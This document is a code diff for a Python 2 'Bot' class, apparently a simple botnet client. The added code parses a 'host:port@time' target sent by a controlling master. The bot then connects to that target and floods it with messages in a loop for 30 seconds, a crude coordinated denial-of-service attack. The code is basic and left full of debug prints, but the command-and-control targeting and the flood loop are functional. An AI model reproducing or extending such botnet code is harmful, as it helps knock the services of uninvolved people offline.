@@ -50,9 +50,22 @@ class Bot:
          currTimeStr = str(self.getCurrTime())
          Util.send(self.master, currTimeStr)
 
-         atkTime = Util.recieve(self.master)
+         info = Util.recieve(self.master)
 
-         self.attack(self.target, atkTime)
+         targetStr, sep, atkTime = info.partition('@')
+         print info
+         print targetStr
+         print sep
+         print atkTime
+
+
+         host, sep, port = targetStr.partition(':')
+         print host
+         print sep
+         print port
+
+         target = (host, int(port))
+         self.attack(target, atkTime)
 
          self.shutdown(None, None)
 
@@ -105,7 +118,10 @@ class Bot:
       targetSocket.connect((target[0], target[1]))
       print 'Connected'
 
-      print 'Attacking!!!!' 
+      startTime = time.time()
+      timeout = 30
+      while time.time() < startTime + timeout:
+         Util.send(targetSocket, 'You\'re being attacked!!!')
 
       targetSocket.close()
 
